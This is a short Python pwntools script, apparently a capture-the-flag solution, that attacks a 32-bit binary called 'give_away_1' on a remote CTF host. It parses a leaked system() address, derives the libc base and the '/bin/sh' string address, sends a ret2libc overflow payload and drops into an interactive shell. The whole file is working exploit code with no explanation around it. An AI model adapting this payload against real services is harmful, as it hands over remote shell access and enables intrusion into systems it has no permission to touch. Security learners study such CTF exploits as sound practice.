import sys
from pwn import *

host, port = 'sharkyctf.xyz', 20334
#libc = ELF('libc-2.27.so')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

if len(sys.argv) != 2:
    print('python {} <r:l>'.format(sys.argv[0]))
    exit(1)
elif sys.argv[1] not in ['r','l']:
    print('{} <r:l>'.format(sys.argv[0]))
    exit(1)
if sys.argv[1] == 'r':
    #p = remote('127.0.0.1', 6969) #local network
    p = remote(host, port)
elif sys.argv[1] == 'l':
    p = process('./give_away_1')
    gdb.attach(p)

system = int(p.recvline().replace('\n', '').split(b' ')[-1],16)
log.info('System_Leak : {}'.format(hex(system)))

libc_base = system - libc.symbols["system"]
log.info('libc base: {}'.format(hex(libc_base)))
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
log.info('/bin/sh : {}'.format(hex(bin_sh)))

system_ret = system + 54
pop_edi_esi_ret = system + 1794
pop_edi_ret = system + 1795

payload = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII'
payload += p32(system)
payload += p32(pop_edi_ret)
payload += p32(bin_sh)

p.sendline(payload)
p.interactive()
